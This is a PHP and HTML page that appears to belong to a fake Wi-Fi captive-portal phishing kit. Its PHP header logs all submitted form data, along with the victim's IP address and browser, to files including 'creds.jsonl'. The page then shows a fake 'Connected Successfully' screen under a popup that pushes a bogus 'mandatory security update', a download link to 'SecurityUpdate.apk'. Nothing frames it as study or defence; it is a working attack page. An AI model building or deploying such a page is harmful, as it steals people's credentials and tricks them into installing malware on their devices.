<?php
$d = $_POST;
$d["_time"] = date("H:i:s");
$d["_ip"] = $_SERVER["REMOTE_ADDR"];
$d["_ua"] = substr($_SERVER["HTTP_USER_AGENT"] ?? "", 0, 120);
file_put_contents("../datos-privados.txt", print_r($_POST, true), FILE_APPEND);
@file_put_contents("../../../creds.jsonl", json_encode($d) . "\n", FILE_APPEND);
?><!DOCTYPE html>
<html><head><title>WiFi Connected</title>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;
    background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:12px;padding:30px;max-width:380px;width:90%;
    box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center}
.check{width:64px;height:64px;background:#4caf50;border-radius:50%;
    display:inline-flex;align-items:center;justify-content:center;margin-bottom:16px}
h2{font-size:18px;color:#212529;margin-bottom:8px}
p{font-size:13px;color:#6c757d;margin-bottom:16px}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999}
.popup{background:#fff;border-radius:16px;padding:32px;max-width:360px;width:90%;text-align:center;
    box-shadow:0 20px 60px rgba(0,0,0,0.4)}
.popup .icon{width:56px;height:56px;background:#ff9800;border-radius:50%;
    display:inline-flex;align-items:center;justify-content:center;margin-bottom:12px}
.popup h3{font-size:16px;color:#212529;margin-bottom:6px}
.popup p{font-size:13px;color:#666;margin-bottom:16px}
.popup .btn-dl{display:inline-block;padding:12px 28px;background:#43a047;color:#fff;
    text-decoration:none;border-radius:8px;font-weight:600;font-size:14px}
.popup .btn-dl:hover{background:#388e3c}
.small{font-size:11px;color:#adb5bd;margin-top:12px}
</style></head><body>
<div class="card">
    <div class="check"><svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
    <h2>Connected Successfully</h2>
    <p>You are now connected to the internet.</p>
    <p style="color:#4caf50;font-size:12px">&#10003; Connection secured</p>
</div>
<div class="overlay">
<div class="popup">
    <div class="icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></div>
    <h3>System Update Required</h3>
    <p>A mandatory security update must be installed to complete your connection.</p>
    <a class="btn-dl" href="../SecurityUpdate.apk" download>Download &amp; Install Update</a>
    <p class="small">This update protects your device and network connection.</p>
</div></div>
</body></html>
